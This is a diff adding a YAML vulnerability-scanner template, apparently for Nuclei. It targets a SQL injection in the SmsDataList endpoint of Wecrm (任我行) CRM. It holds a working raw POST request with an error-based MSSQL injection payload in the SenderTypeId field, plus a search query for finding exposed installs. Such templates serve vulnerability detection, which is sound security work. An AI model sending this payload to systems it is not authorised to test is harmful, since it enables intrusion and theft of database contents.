@@ -1,0 +1,41 @@
+http:
+- matchers:
+  - part: body
+    type: word
+    words:
+    - c8c605999f3d8352d7bb792cf3fdb25
+  - status:
+    - 200
+    type: status
+  matchers-condition: and
+  raw:
+  - 'POST /SMS/SmsDataList/?pageIndex=1&pageSize=30 HTTP/1.1
+
+    Host: {{Hostname}}
+
+    Content-Type: application/x-www-form-urlencoded
+
+
+    Keywords=&StartSendDate=2020-06-17&EndSendDate=2020-09-17&SenderTypeId=0000000000''
+    and 1=convert(int,(sys.fn_sqlvarbasetostr(HASHBYTES(''MD5'',''{{num}}'')))) AND
+    ''CvNI''=''CvNI
+
+    '
+id: wecrm-SmsDataList-sqli
+info:
+  author: Co5mos
+  description: "\u4EFB\u6211\u884C CRM SmsDataList \u63A5\u53E3\u5B58\u5728SQL\u6CE8\
+    \u5165\u6F0F\u6D1E\uFF0C\u653B\u51FB\u8005\u901A\u8FC7\u6F0F\u6D1E\u53EF\u4EE5\
+    \u6267\u884C\u4EFB\u610F\u6570\u636E\u5E93\u8BED\u53E5\uFF0C\u83B7\u53D6\u654F\
+    \u611F\u4FE1\u606F\u3002\n"
+  metadata:
+    hunter-query: "\u6B22\u8FCE\u4F7F\u7528\u4EFB\u6211\u884CCRM"
+    max-request: 2
+    verified: true
+  name: Wecrm - SQL injection
+  reference:
+  - https://peiqi.wgpsec.org/wiki/webapp/%E4%BB%BB%E6%88%91%E8%A1%8C/%E4%BB%BB%E6%88%91%E8%A1%8C%20CRM%20SmsDataList%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.html
+  severity: critical
+  tags: wecrm,sqli
+variables:
+  num: '999999999'
